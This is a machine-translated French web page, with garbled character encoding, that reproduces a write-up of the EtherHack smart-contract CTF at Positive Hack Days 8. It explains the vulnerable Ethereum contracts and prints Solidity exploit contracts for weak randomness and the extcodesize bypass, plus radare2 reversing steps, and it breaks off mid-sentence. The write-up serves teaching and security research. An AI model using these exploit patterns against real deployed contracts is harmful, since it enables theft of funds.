<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë¶üèæ üóëÔ∏è ü§üüèæ Trouver des vuln√©rabilit√©s dans les contrats intelligents: examen EtherHack lors des jours de piratage positifs 8 üëâ üöú üõÉ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Cette ann√©e, PHDays a organis√© pour la premi√®re fois un concours appel√© EtherHack . Les participants ont recherch√© des vuln√©rabilit√©s dans les contrat...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Trouver des vuln√©rabilit√©s dans les contrats intelligents: examen EtherHack lors des jours de piratage positifs 8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="image"></a> <br><br>  Cette ann√©e, PHDays a organis√© pour la premi√®re fois un concours appel√© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">EtherHack</a> .  Les participants ont recherch√© des vuln√©rabilit√©s dans les contrats intelligents pour la vitesse.  Dans cet article, nous vous expliquerons les t√¢ches du concours et les moyens possibles de les r√©soudre. <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4>  Gagnez √† la loterie et cassez le pot! </h4><br>  Les trois premi√®res t√¢ches √©taient li√©es √† des erreurs dans la g√©n√©ration de nombres pseudo-al√©atoires, dont nous avons r√©cemment parl√©: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Pr√©dire les nombres al√©atoires dans les contrats intelligents Ethereum</a> .  La premi√®re t√¢che √©tait bas√©e sur un g√©n√©rateur de nombres pseudo-al√©atoires (PRNG), qui utilisait le hachage du dernier bloc comme source d'entropie pour g√©n√©rer des nombres al√©atoires: <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br>  √âtant donn√© que le r√©sultat de l'appel de la fonction <code>block.blockhash(block.number-1)</code> sera le m√™me pour toute transaction dans le m√™me bloc, l'attaque peut utiliser un contrat d'exploitation avec la m√™me fonction <code>rand()</code> pour appeler le contrat cible via un message interne: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2>  Priv√© Ryan </h2><br><h4>  Nous avons ajout√© une valeur initiale priv√©e que personne ne calculera jamais. </h4><br>  Cette t√¢che est une version l√©g√®rement compliqu√©e de la pr√©c√©dente.  La variable de d√©part, qui est consid√©r√©e comme priv√©e, est utilis√©e pour compenser le nombre ordinal de bloc (block.number) afin que le hachage du bloc ne d√©pende pas du bloc pr√©c√©dent.  Apr√®s chaque pari, la graine est r√©√©crite dans un nouveau d√©calage ¬´al√©atoire¬ª.  Par exemple, dans la loterie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Slotthereum,</a> c'√©tait juste √ßa. <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br>  Comme dans la t√¢che pr√©c√©dente, le pirate n'avait besoin que de copier la fonction <code>rand()</code> dans l'exploit contractuel, mais dans ce cas, la valeur de la variable priv√©e seed devait √™tre obtenue en dehors de la blockchain, puis envoy√©e √† l'exploit comme argument.  Pour ce faire, vous pouvez utiliser la m√©thode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">web3.eth.getStorageAt ()</a> de la biblioth√®que web3: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="image"><br><br>  <i>Lire le magasin de contrats en dehors de la blockchain pour obtenir la valeur initiale</i> <br><br>  Apr√®s avoir re√ßu la valeur initiale, il ne reste plus qu'√† l'envoyer √† l'exploit, qui est presque identique √† celui de la premi√®re t√¢che: <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2>  Roue de la fortune </h2><br><h4>  Cette loterie utilise le hachage du bloc suivant.  Essayez de le calculer! </h4><br>  Dans cette t√¢che, il √©tait n√©cessaire de d√©couvrir le hachage du bloc dont le num√©ro √©tait stock√© dans la structure du jeu apr√®s le pari.  Ce hachage a ensuite √©t√© extrait pour g√©n√©rer un nombre al√©atoire apr√®s le prochain pari. <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br>  Dans ce cas, il existe deux solutions possibles. <br><br><ol><li>  Appelez le contrat cible deux fois via le contrat d'exploitation.  Le r√©sultat de l'appel de la fonction block.blockhash (block.number) sera toujours nul. </li><li>  Attendez que 256 blocs se glissent et faites un deuxi√®me pari.  Le hachage de num√©ro de s√©quence de bloc stock√© sera nul en raison des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">limitations d'Ethereum Virtual Machine (EVM)</a> sur le nombre de hachages de bloc disponibles. </li></ol><br>  Dans les deux cas, le pari gagnant sera <code>uint256(keccak256(bytes32(0))) % 100</code> ou ¬´47¬ª. <br><br><h2>  Appelez-moi peut-√™tre </h2><br><h4>  Ce contrat n'aime pas quand d'autres contrats l'appellent. </h4><br>  Une fa√ßon de prot√©ger un contrat d'√™tre appel√© par d'autres contrats consiste √† utiliser l'instruction d'assemblage EVM <code>extcodesize</code> , qui renvoie la taille du contrat √† son adresse.  La m√©thode consiste √† utiliser cette instruction pour l'adresse de l'exp√©diteur de la transaction √† l'aide de l'insertion d'assembleur.  Si le r√©sultat est sup√©rieur √† z√©ro, l'exp√©diteur de la transaction est un contrat, car les adresses ordinaires dans Ethereum n'ont pas de code.  C'est pr√©cis√©ment cette approche qui a √©t√© utilis√©e dans cette t√¢che pour emp√™cher d'autres contrats d'appeler le contrat. <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  La <code>tx.origin</code> transaction <code>tx.origin</code> pointe vers le cr√©ateur d'origine de la transaction et msg.sender vers le dernier appelant.  Si nous envoyons la transaction √† partir de l'adresse habituelle, ces variables seront √©gales et nous nous retrouverons avec <code>revert()</code> .  Par cons√©quent, pour r√©soudre notre probl√®me, il √©tait n√©cessaire de contourner la v√©rification de l'instruction <code>extcodesize</code> afin que <code>tx.origin</code> et <code>msg.sender</code> diff√©rents.  Heureusement, il existe une fonctionnalit√© int√©ressante dans EVM qui peut vous aider: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="image"><br><br>  En effet, lorsque le contrat qui vient d'√™tre plac√© appelle un autre contrat chez le constructeur, il n'existe pas encore lui-m√™me dans la blockchain, il agit exclusivement comme un portefeuille.  Ainsi, le code n'est pas li√© au nouveau contrat et extcodesize renverra z√©ro: <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2>  La serrure </h2><br><h4>  Curieusement, le ch√¢teau est ferm√©.  Essayez de r√©cup√©rer le code PIN via la fonction de d√©verrouillage (code PIN octets4).  Chaque tentative de d√©verrouillage vous co√ªtera 0,5 √©ther. </h4><br>  Dans cette t√¢che, les participants n'ont pas re√ßu de code - ils ont d√ª restaurer la logique du contrat par son bytecode.  Une option √©tait d'utiliser Radare2, une plate-forme utilis√©e pour <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">d√©monter</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">d√©boguer les EVM</a> . <br><br>  Pour commencer, nous publierons un exemple de la t√¢che et entrerons le code au hasard: <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) ‚Üí<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br>  La tentative, bien s√ªr, est bonne, mais infructueuse.  Essayez maintenant de d√©boguer cette transaction. <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br>  Dans ce cas, nous demandons √† Radare2 d'utiliser l'architecture evm.  Cet outil se connecte ensuite au n≈ìud Ethereum et r√©cup√®re la trace de cette transaction dans la machine virtuelle.  Et maintenant, enfin, nous sommes pr√™ts √† plonger dans le bytecode EVM. <br><br>  Tout d'abord, vous devez effectuer une analyse: <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br>  Ensuite, nous d√©montons les 1000 premi√®res instructions (cela devrait suffire pour couvrir l'int√©gralit√© du contrat) √† l'aide de la commande pd 1000 et passons √† l'affichage du graphique avec la commande VV. <br><br>  Dans le code d'octets EVM compil√© avec <code>solc</code> , le gestionnaire de fonctions vient g√©n√©ralement en premier.  Sur la base des quatre premiers octets des donn√©es d'appel contenant la signature de fonction, qui est d√©finie comme <code>bytes4(sha3(function_name(params)))</code> , le gestionnaire de fonction d√©cide quelle fonction appeler.  Nous nous int√©ressons √† la fonction de <code>unlock(bytes4)</code> , qui correspond √† <code>0x75a4e3a0</code> . <br><br>  Apr√®s le flux d'ex√©cution √† l'aide de la cl√© s, nous arrivons au n≈ìud qui compare l' <code>callvalue</code> avec la valeur <code>0x6f05b59d3b20000</code> ou <code>500000000000000000</code> , ce qui √©quivaut √† 0,5 √©ther: <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br>  Si l'√©ther fourni est suffisant, alors on se retrouve dans un n≈ìud qui ressemble √† une structure de contr√¥le: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br>  Le code place la valeur 0x4 en haut de la pile, v√©rifie la limite sup√©rieure (la valeur ne doit pas d√©passer 0xff) et compare lt avec une valeur qui a √©t√© dupliqu√©e √† partir du quatri√®me √©l√©ment de la pile (dup4). <br><br>  En d√©filant tout en bas du graphique, nous voyons que ce quatri√®me √©l√©ment est essentiellement un it√©rateur, et cette structure de contr√¥le est une boucle qui correspond √† <code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br>  Si nous consid√©rons le corps de la boucle, il devient √©vident qu'il √©num√®re quatre octets entrants et effectue certaines op√©rations avec chacun des octets.  Tout d'abord, la boucle v√©rifie que le ni√®me octet est sup√©rieur √† 0x30: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br>  et aussi que cette valeur est inf√©rieure √† 0x39: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br>  qui est essentiellement une v√©rification que l'octet donn√© est dans la plage de 0 √† 9. Si la v√©rification r√©ussit, nous nous retrouvons dans le bloc de code le plus important: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="image"><br><br>  D√©composons ce bloc en plusieurs parties: <br><br>  1. Le troisi√®me √©l√©ment de la pile est le code ASCII du ni√®me octet du code PIN.  0x30 (code ASCII pour z√©ro) est pouss√© sur la pile puis soustrait du code de cet octet: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br>  Autrement dit, le <code>pincode[i] - 48</code> , et nous obtenons essentiellement un chiffre du code ASCII, appelons-le d. <br><br>  2. 0x4 est ajout√© √† la pile et utilis√© comme exposant pour le deuxi√®me √©l√©ment de la pile, d: <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br>  Autrement dit, <code>d ** 4</code> . <br><br>  3. Le cinqui√®me √©l√©ment de la pile est r√©cup√©r√© et le r√©sultat de l'exponentiation y est ajout√©.  Appelons cette somme S: <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br>  Autrement dit, <code>S += d ** 4</code> . <br><br>  4. 0xa (code ASCII pour 10) est pouss√© sur la pile et utilis√© comme multiplicateur pour le septi√®me √©l√©ment de la pile (qui √©tait le sixi√®me avant cet ajout).  Nous ne savons pas ce que c'est, donc nous appellerons cet √©l√©ment U. Ensuite, d est ajout√© au r√©sultat de la multiplication: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br>  C'est-√†-dire: <code>U = U * 10 + d</code> ou, plus simplement, cette expression r√©cup√®re le code PIN entier sous forme de nombre √† partir d'octets individuels <code>([0x1, 0x3, 0x3, 0x7] ‚Üí 1337)</code> . <br><br>  La chose la plus difficile que nous ayons faite, passons maintenant au code apr√®s la boucle. <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br>  Si les cinqui√®me et sixi√®me √©l√©ments de la pile sont √©gaux, le flux d'ex√©cution nous m√®nera √† l'instruction sstore, qui d√©finit un certain indicateur dans le magasin de contrats.  Puisque c'est la seule instruction sstore, c'est apparemment ce que nous recherchions. <br><br>  Mais comment passer ce test?  Comme nous l'avons d√©j√† d√©couvert, le cinqui√®me √©l√©ment de la pile est S et le sixi√®me est U. Puisque S est la somme de tous les chiffres du code PIN √©lev√© √† la quatri√®me puissance, nous avons besoin d'un code PIN pour lequel cette condition sera remplie.  Dans notre cas, l'analyse a montr√© que <code>1**4 + 3**4 + 3**4 + 7**4</code> n'est pas √©gal √† 1337, et nous ne sommes pas <code>sstore</code> instruction gagnante <code>sstore</code> . <br><br>  Mais maintenant, nous pouvons calculer un nombre qui satisfait aux conditions de cette √©quation.  Il n'y a que trois nombres qui peuvent √™tre √©crits comme la somme de leurs chiffres du quatri√®me degr√©: 1634, 8208 et 9474. Chacun d'entre eux peut ouvrir la serrure! <br><br><h2>  Bateau pirate </h2><br><h4>  Salut Salag!  Un bateau pirate amarr√© au port.  Faites-lui jeter l'ancre et soulevez le drapeau avec Jolly Roger et partez √† la recherche de tr√©sors. </h4><br>  Le cours standard d'ex√©cution du contrat comprend trois actions: <br><br><ol><li>  Un appel √† la fonction <code>dropAnchor()</code> avec un num√©ro de bloc qui doit √™tre plus de 100 000 blocs plus grand que le bloc actuel.  La fonction cr√©e dynamiquement un contrat, qui est une "ancre", qui peut √™tre "lev√©e" en utilisant <code>selfdestruct()</code> apr√®s le bloc sp√©cifi√©. </li><li>  Un appel √† la fonction <code>pullAnchor()</code> , qui lance <code>selfdestruct()</code> si suffisamment de temps s'est √©coul√© (beaucoup de temps!). </li><li>  Appelez sailAway (), qui d√©finit <code>blackJackIsHauled</code> sur true s'il n'existe aucun contrat d'ancrage. </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br>  La vuln√©rabilit√© est assez √©vidente: nous avons une injection directe d'instructions d'assembleur lors de la cr√©ation d'un contrat dans la fonction <code>dropAnchor()</code> .  Mais la principale difficult√© √©tait de cr√©er une charge utile qui nous permettrait de passer le <code>block.number</code> . <br><br>  Dans EVM, vous pouvez cr√©er des contrats √† l'aide de l'instruction create.  Ses arguments sont la valeur, le d√©calage d'entr√©e et la taille d'entr√©e.  value est un bytecode qui h√©berge le contrat lui-m√™me (code d'initialisation).  Dans notre cas, le code d'initialisation + le code de contrat est plac√© dans uint256 (merci √† l'√©quipe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">GasToken</a> pour l'id√©e): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br>  o√π les octets en gras sont le code du contrat h√©berg√© et 414141 est le site d'injection.  Puisque nous sommes confront√©s √† la t√¢che de nous d√©barrasser de l'op√©rateur de projection, nous devons ins√©rer notre nouveau contrat et r√©√©crire la partie finale du code d'initialisation.  Essayons d'injecter le contrat avec l'instruction 0xff, ce qui entra√Ænera la 